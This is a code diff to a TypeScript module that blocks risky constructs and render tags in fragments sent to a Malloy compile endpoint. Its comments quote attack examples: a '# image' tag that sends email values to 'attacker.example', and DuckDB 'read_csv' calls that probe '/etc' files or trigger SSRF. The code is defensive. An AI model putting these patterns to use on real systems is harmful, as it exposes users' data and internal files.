@@ -21,34 +21,24 @@ import { translatorMalloyError } from "./translator_error";
 /**
  * Construct containment for caller-submitted `/compile` text.
  *
- * Malloy resolves a source's schema AT COMPILE TIME: `duckdb.sql("...")`
- * sends a `DESCRIBE` to the connection before any query runs, and
- * `connection.table(...)` fetches the table's schema the same way. So a
- * compile-only endpoint still reaches the database, the filesystem and the
- * network on the caller's behalf. Against DuckDB's external access that makes
- * unrestricted compile an oracle rather than a check: `read_csv('/etc/...')`
- * distinguishes an existing file from a missing one by its error, names the
- * columns of whatever it does read, and `read_csv('https://...')` issues the
- * request. No rows come back, so the exposure is disclosure and SSRF rather
- * than bulk extraction.
+ * Malloy resolves schemas at compile time: `duckdb.sql("...")` and
+ * `connection.table(...)` reach the connection before any query runs. Against
+ * DuckDB's external access, unrestricted compile is an oracle:
+ * `read_csv('/etc/...')` reveals whether a file exists and its columns, and
+ * `read_csv('https://...')` issues the request (disclosure and SSRF, not bulk
+ * extraction). The query path refuses these with Malloy's restricted mode;
+ * this applies the same refusal at `append`, the scope whose text is a
+ * fragment judged against a curated model.
  *
- * The query path already refuses these constructs with Malloy's restricted mode
- * (`loadRestrictedQuery`). This applies the same refusal at `append`, the one
- * compile scope whose text is a fragment judged against a curated model.
+ * Scope: the caller chooses `scope`, and the scopes carry no authorization
+ * difference, so this keeps fragment authoring on the published surface
+ * rather than containing an adversary who can ask for `file`. `file` and
+ * `package` are ungated by design (there the text IS the model). Making this
+ * a containment boundary would require authorizing the scope.
  *
- * SCOPE, STATED HONESTLY: `scope` is a request-body field the caller chooses,
- * and the three scopes carry no authorization difference today, so this keeps
- * fragment authoring on the model's published surface rather than containing an
- * adversary who can simply ask for `file`. `file` and `package` are ungated by
- * design -- there the text IS the model, where declaring sources and imports is
- * the point -- and that predates this module. Making the refusal a containment
- * boundary means authorizing the scope, which is a separate change.
- *
- * WHY THE COMPILER AND NOT A PATTERN MATCH: which spellings reach a connection
- * is the compiler's classification, not a list this module could keep current.
- * A byte match over untrusted text both over- and under-fires -- it would flag
- * `duckdb.sql` inside a string literal and miss any form it had not heard of.
- * Malloy decides, and reports its decisions with
+ * The compiler classifies, not a pattern match: a byte match over untrusted
+ * text would flag `duckdb.sql` inside a string literal and miss spellings it
+ * did not know. Malloy reports its decisions with
  * `code: 'restricted-construct-forbidden'`.
  */
 
@@ -56,9 +46,8 @@ import { translatorMalloyError } from "./translator_error";
 const RESTRICTED_CONSTRUCT_CODE = "restricted-construct-forbidden";
 
 /**
- * Malloy's code for text that did not parse (`lang/parse-log.d.ts`). Emitted by
- * the parser's own error listener, so it marks the case where no tree was built
- * and therefore nothing in the text was classified.
+ * Malloy's code for text that did not parse, emitted by the parser's error
+ * listener: no tree was built, so nothing in the text was classified.
  */
 const SYNTAX_ERROR_CODE = "syntax-error";
 
@@ -85,26 +74,23 @@ function restrictedRejections(problems: readonly LogMessage[]): LogMessage[] {
    );
 }
 
-/**
- * Render tags that turn a cell value into a URL or markup the viewer's browser
- * acts on: `# image` draws `<img src=value>` and `# link` an `<a href>`, with no
- * scheme or host check, so a field the caller defines as
- * `# image pic is concat('https://attacker.example/p?d=', email)` sends the
- * value the viewer may read to a host of the caller's choosing. A model's own
- * fields keep them (the modeler is trusted); a fragment may not write them.
+/*
+ * Render-tag refusal (for document text). `# image` draws `<img src=value>`
+ * and `# link` an `<a href>` with no scheme or host check, so a fragment
+ * field `# image pic is concat('https://attacker.example/p?d=', email)` sends
+ * a value the viewer can read to the caller's host. A model's own fields keep
+ * these tags (the modeler is trusted); a fragment may not write them.
  *
- * Malloy passes annotations through verbatim and the renderer reads them with
- * the MOTLY tag parser, so this reads them the same way: the fragment is
- * PARSED (no schema, no connection, so the answer cannot depend on whether the
- * data exists), every `#` and `#|` annotation is collected from its lexer tokens,
- * and each is parsed as MOTLY. Quoting, backticks, escapes, blocks and a field
- * named `link` used as a value all fall out of that, which a text match cannot
- * promise. Only the single-hash forms are field tags; `##` notes describe the
- * model and are never drawn.
+ * The renderer reads annotations with the MOTLY parser, so this does too: the
+ * fragment is parsed (no schema, no connection, so the answer cannot depend on
+ * the data), every `#`/`#|` annotation is collected from the lexer tokens and
+ * parsed as MOTLY. Quoting, escapes and blocks then behave as the renderer
+ * sees them, which a text match cannot promise. `##` notes describe the model
+ * and are never drawn.
  *
- * Not covered here: renderer sinks that take a data value with no tag (a chart
- * axis label measured through `innerHTML`, pivot headers). Those are the
- * renderer's to fix, and a host content-security-policy is the backstop.
+ * Not covered: renderer sinks that take an untagged value (chart axis labels
+ * via `innerHTML`, pivot headers). Those are the renderer's to fix; a host
+ * content-security-policy is the backstop.
  */
 /** A tag is markup when it is an opening or closing tag closed by `>`, a comment or a doctype; `a<b` is text. */
 const HTML_START = /<\/?[A-Za-z][^>]*>|<!--|<![A-Za-z]/;
@@ -407,43 +393,27 @@ export function assertNoRenderTags(source: string): void {
  * Compile `source` against `model` in restricted mode and throw if it uses a
  * construct that reaches outside the model's curated surface.
  *
- * Only restricted-construct rejections are acted on here, with ONE exception:
- * a parse failure (below). Every other diagnostic -- an undefined field, a
- * redefinition -- is left untouched for the real compile to report, so this
- * gate never becomes a second source of ordinary compile errors with its own
- * coordinates and wording.
+ * Only restricted-construct rejections and parse failures are acted on; other
+ * diagnostics are left for the real compile, so this gate never reports
+ * ordinary compile errors with its own coordinates and wording.
  *
- * The exception exists because this gate parses a DIFFERENT unit from the
- * compile it guards: it judges the fragment alone, while the real compile runs
- * `${modelContent}\n${source}`. It cannot simply be handed the concatenation --
- * `extendModel` judges text as an extension of a model that already holds those
- * declarations, so the model's own text comes back as `Cannot redefine` for
- * every source in it and nothing in the appended fragment is classified at all.
- * So the units stay different, and the gate instead refuses whenever it could
- * not parse what it was given.
+ * Parse failures are refused because this gate judges the fragment alone while
+ * the real compile runs `${modelContent}\n${source}`. It cannot be handed the
+ * concatenation: `extendModel` would report `Cannot redefine` for every source
+ * in the model and classify nothing in the fragment. Running the real append
+ * compile as one unrestricted `extendModel` of the loaded model would unify the
+ * two units (at the cost of offsetting every diagnostic position); the
+ * parse-failure refusal is sufficient without it.
  *
- * What is ruled out above is the CONCATENATION, not the fragment. Running the
- * real append compile as an unrestricted `extendModel` of the loaded base model
- * -- the fragment alone, once, in place of both compiles -- is a live option: it
- * would make the gate and the compile one unit and drop the second compile from
- * inside the per-package mutex, at the cost of offsetting every diagnostic
- * position by the model's line count. It is a larger change than this gate, and
- * the parse-failure refusal is sufficient without it.
- *
- * The gate is deliberately a separate compile from the one whose diagnostics
- * the caller receives. Restricted mode changes what compiles, so reusing its
- * result as the answer would change the positions and the problem set an
- * author sees for legitimate text. This runs first, refuses or passes, and the
- * unrestricted compile then proceeds exactly as before.
+ * This stays a separate compile from the one whose diagnostics the caller
+ * receives: restricted mode changes what compiles, so reusing its result would
+ * change positions and problems an author sees for legitimate text.
  */
 export async function assertNoRestrictedConstructs(
    runtime: Runtime,
-   // Not `Model | undefined`. Several of the constructs this refuses --
-   // `name!type(...)` and the `sql_*` family -- are classified inside
-   // `computeExpression(fs)` and need a resolved FieldSpace, so with no base
-   // model they are never classified and the gate returns clean on text it
-   // should refuse. Requiring one makes that a type error rather than a
-   // convention a later caller can break silently.
+   // Not optional: `name!type(...)` and the `sql_*` family are classified
+   // inside `computeExpression(fs)`, which needs a resolved FieldSpace. With no
+   // base model they would pass unclassified.
    model: Model,
    source: string,
    /**
@@ -460,26 +430,20 @@ export async function assertNoRestrictedConstructs(
          source,
          model,
          restrictedMode: true,
-         // Labels the synthetic `internal://` URL this compile is given; the
-         // text is an extension of an already-loaded model, not a model of its
-         // own.
+         // The text extends an already-loaded model.
          method: "extendModel",
          urlReader: runtime.urlReader,
          connections: runtime.connections,
-         // Collect problems rather than throwing on the first one, so a caller
-         // using two forbidden constructs is told about both at once.
+         // Collect every problem so the caller hears about all forbidden constructs.
          noThrowOnError: true,
       });
       problems = compiled.problems ?? [];
    } catch (error) {
-      // A MalloyError still carries the diagnostics, so a restricted rejection
-      // that arrives as a throw is the refusal this gate exists for. Anything
-      // else is an infrastructure failure (an unreachable connection, a bad
-      // URL) and must stay distinguishable from "the caller wrote something
-      // forbidden" -- silently treating it as a pass would open the gate on
-      // exactly the errors that carry no evidence either way.
-      // The translator's plain Error is the caller's text, not the
-      // infrastructure: it is read as the one problem it stands for.
+      // A MalloyError carries diagnostics, so a restricted rejection thrown is
+      // still a refusal; the translator's plain Error is the caller's text and
+      // is read as one problem. Anything else is infrastructure (unreachable
+      // connection, bad URL) and is rethrown: treating it as a pass would open
+      // the gate on errors that carry no evidence either way.
       const compileError =
          error instanceof MalloyError ? error : translatorMalloyError(error);
       if (!compileError) throw error;
@@ -488,19 +452,11 @@ export async function assertNoRestrictedConstructs(
 
    const rejected = restrictedRejections(problems);
    if (rejected.length === 0) {
-      // A PARSE FAILURE IS NOT A PASS. Classification happens while walking a
-      // parsed tree, so text that never parsed was never judged -- the gate
-      // saw no forbidden construct because it saw no constructs at all. Before
-      // this, that silence was read as approval, which is the wrong direction
-      // for a gate: the one text guaranteed to produce it is text that does
-      // not stand alone, and the real compile may still run it as part of a
-      // larger whole.
-      //
-      // Only a parse-level failure is treated this way. An ordinary semantic
-      // error -- an undefined field, a redefinition -- means the tree WAS
-      // walked and the constructs in it WERE classified, so the absence of a
-      // rejection there is real evidence and the diagnostic belongs to the
-      // caller-facing compile rather than to this gate.
+      // A parse failure is not a pass: classification walks a parsed tree, so
+      // unparsed text was never judged, and the real compile may still run it
+      // as part of a larger whole. A semantic error (undefined field,
+      // redefinition) means the tree was walked, so no rejection there is real
+      // evidence and the diagnostic belongs to the real compile.
       const parseFailures = problems.filter(isParseFailure);
       if (parseFailures.length > 0) {
          const detail = parseFailures
@@ -519,8 +475,7 @@ export async function assertNoRestrictedConstructs(
       return;
    }
 
-   // A caller-input refusal, so 400 rather than a compile-diagnostics response:
-   // the text is not being reported as invalid Malloy, it is being refused.
+   // A caller-input refusal (400), not a compile-diagnostics response.
    throw new CompileRefusedError(
       `This Malloy cannot be compiled at scope "append", which validates a ` +
          `fragment against the model's published surface: ` +
